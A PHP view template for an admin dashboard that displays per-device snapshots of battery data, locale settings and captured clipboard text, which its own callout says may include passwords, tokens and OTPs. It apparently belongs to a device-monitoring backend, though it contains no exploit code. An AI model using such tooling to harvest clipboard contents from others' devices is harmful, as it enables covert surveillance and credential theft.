<?php /** @var array $rows @var int $total @var object $pager @var string $nav_urls */ ?>
<?php
// Deduplicate: group by device_id and keep only the latest snapshot
$seen = [];
$unique = [];
foreach ($rows as $r) {
    $devId = $r['device_id'] ?? 'default';
    $key   = strtolower(trim((string)$devId));
    if (!isset($seen[$key])) {
        $seen[$key] = true;
        $unique[]   = $r;
    }
}
$rows = $unique;
?>

<style>
.ctx-card       { border-radius: 8px; background: #fff; box-shadow: 0 0 1px rgba(0,0,0,.125), 0 1px 3px rgba(0,0,0,.2); }
.ctx-hero       { background: linear-gradient(135deg, #6c757d 0%, #5a6268 60%, #495057 100%); border-radius: 8px 8px 0 0; padding: 18px 22px; color: #fff; }
.ctx-kv         { display: flex; justify-content: space-between; align-items: center; padding: 5px 0; border-bottom: 1px solid #f0f0f0; font-size: 13px; }
.ctx-kv:last-child { border-bottom: none; }
.ctx-kv .ck     { color: #6c757d; font-weight: 600; font-size: 11px; text-transform: uppercase; }
.ctx-kv .cv     { font-weight: 700; color: #343a40; text-align: right; max-width: 60%; word-break: break-all; }
.ctx-badge      { border-radius: 12px; padding: 2px 8px; font-size: 11px; font-weight: 700; }
.progress-bar-container { height: 8px; border-radius: 4px; background: #e9ecef; overflow: hidden; margin-top: 5px; }
.progress-bar-fill { height: 100%; border-radius: 4px; transition: width .4s; }
.section-label  { font-size: 10px; font-weight: 700; color: #6c757d; text-transform: uppercase; letter-spacing: .4px; }
.clip-box       { font-family: monospace; font-size: 12px; background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 4px; padding: 10px; max-height: 150px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; color: #495057; }
</style>

<div class="content-wrapper">
  <!-- Educational Callout -->
  <section class="content-header">
    <div class="container-fluid">
      <div class="row mb-3 align-items-center">
        <div class="col-lg-7">
          <div class="d-flex align-items-center flex-wrap">
            <h1 class="h2 mb-0 mr-3"><i class="fas fa-info-circle text-primary mr-2"></i>Device Context</h1>
            <span class="badge badge-secondary border p-2 text-white"><i class="fas fa-database mr-1"></i>Active Snapshots: <b><?= count($rows) ?></b></span>
          </div>
          <p class="text-muted mt-1 mb-0">Runtime environment settings, battery telemetry, locale configurations, and clipboard memory buffers</p>
        </div>
        <div class="col-lg-5 text-right"><?= $nav_urls ?></div>
      </div>

      <!-- Consistent Security Callout -->
      <div class="callout callout-info shadow-sm p-3 mb-4" style="border-left:5px solid #17a2b8;background:#fdfdfd;border-radius:4px;">
        <h5 class="font-weight-bold text-info"><i class="fas fa-shield-alt mr-2"></i>Biometric Security Telemetry &amp; Context Audit</h5>
        <p class="text-secondary mb-2" style="font-size:14px;">Forensic monitoring of the device's immediate operating context. Tracking battery metrics, active clipboard strings, and locale settings highlights sandbox environments, active debugging triggers, or leaks of sensitive user data.</p>
        <div class="row" style="font-size:12px;">
          <div class="col-md-4 border-right">
            <b class="d-block mb-1">Battery Telemetry:</b>
            <ul class="pl-3 mb-0 text-muted">
              <li><b>Battery Health &amp; Temperature:</b> Monitors physical hardware indicators. Fake devices or emulators often report static values (e.g. 0mV or exactly 25°C).</li>
            </ul>
          </div>
          <div class="col-md-4 border-right pl-md-3">
            <b class="d-block mb-1">Clipboard Buffer:</b>
            <ul class="pl-3 mb-0 text-muted">
              <li><b>Active Memory:</b> Logs clipboard text strings. Sensitive fields (passwords, tokens, SMS OTPs) remain vulnerable if cached in plain text.</li>
            </ul>
          </div>
          <div class="col-md-4 pl-md-3">
            <b class="d-block mb-1">Locale Configuration:</b>
            <ul class="pl-3 mb-0 text-muted">
              <li><b>Language &amp; TZ Offset:</b> Validates timezone offsets against SIM operator regions to detect spoofed GPS coordinates.</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  </section>

  <section class="content">
    <div class="container-fluid">

      <?php if (empty($rows)): ?>
        <div class="text-center py-5">
          <i class="fas fa-info-circle fa-3x text-muted mb-3"></i>
          <h4 class="text-secondary">No Device Context Detected</h4>
          <p class="text-muted">Context logs will appear here once extracted.</p>
        </div>
      <?php else: ?>

        <?php foreach ($rows as $r):
          $rid = $r['id'] ?? 0;
          $ts = !empty($r['extracted_at']) ? format_timestamp_display((int)$r['extracted_at']) : '—';
          
          $batLvl = (float)($r['battery_level_percent'] ?? 0);
          $batChg = !empty($r['battery_is_charging']);
          $batHealth = $r['battery_health'] ?? '—';
          $batTemp = $r['battery_temperature_celsius'] ?? null;
          $batVolt = $r['battery_voltage_mv'] ?? null;
          $usbPlug = !empty($r['battery_plugged_usb']);
          $acPlug  = !empty($r['battery_plugged_ac']);
          
          $lang = $r['locale_display_language'] ?? '—';
          $cty  = $r['locale_display_country'] ?? '—';
          $tz   = $r['locale_timezone'] ?? '—';
          $tzOff = $r['locale_timezone_offset_ms'] ?? null;
          
          $clipboard = $r['clipboard_text'] ?? '';
          
          $batColor = $batLvl > 50 ? '#28a745' : ($batLvl > 20 ? '#ffc107' : '#dc3545');
          ?>

          <div class="card ctx-card mb-4">
            <!-- Hero -->
            <div class="ctx-hero">
              <div class="d-flex align-items-center justify-content-between">
                <div>
                  <h5 class="font-weight-bold mb-0"><i class="fas fa-mobile-alt mr-2"></i>Context Snapshot</h5>
                  <small class="d-block mt-1" style="opacity: 0.85;">Device ID: <?= esc($r['device_id'] ?? '—') ?></small>
                </div>
                <div class="text-right">
                  <span class="badge badge-light ctx-badge"><i class="fas fa-battery-<?= $batLvl > 75 ? 'full' : ($batLvl > 50 ? 'three-quarters' : ($batLvl > 25 ? 'half' : 'quarter')) ?> mr-1"></i><?= round($batLvl) ?>%</span>
                  <?php if ($batChg): ?>
                    <span class="badge badge-success ctx-badge ml-1"><i class="fas fa-bolt mr-1"></i>Charging</span>
                  <?php endif; ?>
                </div>
              </div>
            </div>

            <div class="card-body">
              <div class="row">
                
                <!-- Col 1: Battery Telemetry -->
                <div class="col-md-4 mb-3">
                  <div class="section-label mb-2"><i class="fas fa-battery-three-quarters mr-1"></i>Battery Power Telemetry</div>
                  
                  <div class="mb-3">
                    <div class="d-flex justify-content-between" style="font-size: 12px; font-weight: 700;">
                      <span class="text-muted">Charge Level</span>
                      <span><?= round($batLvl) ?>%</span>
                    </div>
                    <div class="progress-bar-container">
                      <div class="progress-bar-fill" style="width: <?= $batLvl ?>%; background: <?= $batColor ?>;"></div>
                    </div>
                  </div>

                  <div class="ctx-kv"><span class="ck">Battery Health</span><span class="cv"><?= esc($batHealth) ?></span></div>
                  <?php if ($batTemp !== null): ?>
                    <div class="ctx-kv"><span class="ck">Temperature</span><span class="cv"><?= esc($batTemp) ?> °C</span></div>
                  <?php endif; ?>
                  <?php if ($batVolt !== null): ?>
                    <div class="ctx-kv"><span class="ck">Voltage</span><span class="cv"><?= esc($batVolt) ?> mV</span></div>
                  <?php endif; ?>
                  <div class="ctx-kv"><span class="ck">Plugged USB</span><span class="cv"><?= $usbPlug ? 'Yes' : 'No' ?></span></div>
                  <div class="ctx-kv"><span class="ck">Plugged AC</span><span class="cv"><?= $acPlug ? 'Yes' : 'No' ?></span></div>
                </div>

                <!-- Col 2: Locale Settings -->
                <div class="col-md-4 mb-3">
                  <div class="section-label mb-2"><i class="fas fa-language mr-1"></i>Locale &amp; Regional Settings</div>
                  <div class="ctx-kv"><span class="ck">Display Language</span><span class="cv"><?= esc($lang) ?></span></div>
                  <div class="ctx-kv"><span class="ck">Display Country</span><span class="cv"><?= esc($cty) ?></span></div>
                  <div class="ctx-kv"><span class="ck">ISO Language Code</span><span class="cv"><code><?= esc($r['locale_language'] ?? '—') ?></code></span></div>
                  <div class="ctx-kv"><span class="ck">ISO Country Code</span><span class="cv"><code><?= esc($r['locale_country'] ?? '—') ?></code></span></div>
                  <div class="ctx-kv"><span class="ck">Timezone</span><span class="cv"><code><?= esc($tz) ?></code></span></div>
                  <?php if ($tzOff !== null): ?>
                    <div class="ctx-kv"><span class="ck">Timezone Offset</span><span class="cv"><?= round($tzOff / 3600000, 1) ?> hrs</span></div>
                  <?php endif; ?>
                </div>

                <!-- Col 3: Clipboard Content -->
                <div class="col-md-4 mb-3">
                  <div class="section-label mb-2"><i class="fas fa-clipboard mr-1"></i>Clipboard Forensic Snippet</div>
                  <?php if ($clipboard !== '' && $clipboard !== '—'): ?>
                    <div class="clip-box"><?= esc($clipboard) ?></div>
                    <div class="mt-2 text-right">
                      <button class="btn btn-xs btn-outline-secondary" onclick="navigator.clipboard.writeText(document.querySelector('.clip-box').innerText)">
                        <i class="fas fa-copy mr-1"></i>Copy Clipboard Content
                      </button>
                    </div>
                  <?php else: ?>
                    <div class="text-center text-muted py-4" style="background:#f8f9fa; border:1px dashed #dee2e6; border-radius:4px;">
                      <i class="fas fa-eraser mb-2 d-block"></i>
                      <span class="small">Clipboard Buffer Empty</span>
                    </div>
                  <?php endif; ?>
                </div>

              </div>

              <!-- Footer -->
              <div class="d-flex justify-content-between align-items-center border-top pt-2 mt-2">
                <small class="text-muted">Row ID: <?= $rid ?> · Extracted: <?= $ts ?></small>
                <button class="btn btn-sm btn-outline-danger delete-row py-0"
                  data-id="<?= $rid ?>"
                  data-url="<?= base_url('advanced/hardware/device/delete') ?>">
                  <i class="fas fa-trash mr-1"></i>Remove Snapshot
                </button>
              </div>
            </div>
          </div>

        <?php endforeach; ?>

        <?php if (isset($pager)): ?>
          <div class="d-flex justify-content-end"><?= $pager->links('default', 'bootstrap5_full') ?></div>
        <?php endif; ?>

      <?php endif; ?>
    </div>
  </section>
</div>
<?php include __DIR__ . '/_adv_style.php'; ?>
<?php include __DIR__ . '/_adv_delete_script.php'; ?>
